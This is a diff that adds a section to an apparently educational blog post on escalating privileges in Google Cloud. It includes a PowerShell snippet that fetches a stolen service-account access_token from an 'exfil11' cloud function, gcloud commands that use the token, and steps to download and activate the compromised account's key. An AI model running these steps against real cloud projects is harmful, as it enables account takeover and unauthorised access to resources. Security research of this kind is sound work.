@@ -1019,4 +1019,39 @@ Finally we can invoke the code and retrieve the *access_token* to use for privil
   <img src="https://github.com/anrbn/blog/blob/main/images/42.1.png">
 </p>
 
-### Escalating Privilege to a high level Service Account
+### Escalating Privilege to a High Level Service Account
+
+With the access to the *access_token* what can we do? Well, a lot. One being authenticating and accessing various GCP APIs, services and resources, such as Google Cloud Storage, Google Cloud Compute Engine, and Google Kubernetes Engine etc. The gCloud argument --access-token-file let's specify a file which has the *access_token* and then allows you to perform actions and access resources in GCP as the user or service account associated with the token. 
+
+Below is a Powershell Command that will put the the *access_token* into a txt file, to be used later with gCloud.
+
+```powershell
+$response = Invoke-WebRequest -Uri "https://us-east1-nnnn-374620.cloudfunctions.net/exfil11" -UseBasicParsing
+$jsonResponse = $response | ConvertFrom-Json
+$accessToken = $jsonResponse.access_token
+$accessToken | Out-File -FilePath "code.txt"
+```
+Example Usage:
+
+```shell
+gcloud projects list --access-token-file=code.txt
+gcloud projects list --access-token-file=C:\Users\Administrator\code.txt
+```
+>You might encounter an error *"ERROR: gcloud crashed (UnicodeDecodeError): 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte"* if you use the above command. This has something to do with the gCloud version in use.
+
+There's another way to make use of *access_token* and that is to download the Service Account Key (Key of the Service Account you just compromised) in JSON format, and then use gCloud to activate the Service Account Key and make requests, access the GCP Resources without any errors. 
+
+The tool communicates to Identity and Access Management (IAM) API via gRPC and lets you to create and download the Service Account Key in JSON Format. 
+
+Once you've downloaded the JSON Key file for the Service Account you can authenticate and activate it via gCloud. 
+
+Command to Activate the Service Account via gcloud:
+
+```shell
+gcloud auth activate-service-account --key-file="C:/Users/Administrator/Downloads/service_account.json" 
+```
+<p>
+  <img src="https://github.com/anrbn/blog/blob/main/images/17.png">
+</p>
+
+After you've activated the Service Account, you can now run commands as the activated service account user. If the Service Account has Editor level permission one can perform a wide range of actions on Google Cloud resources without any restrictions.
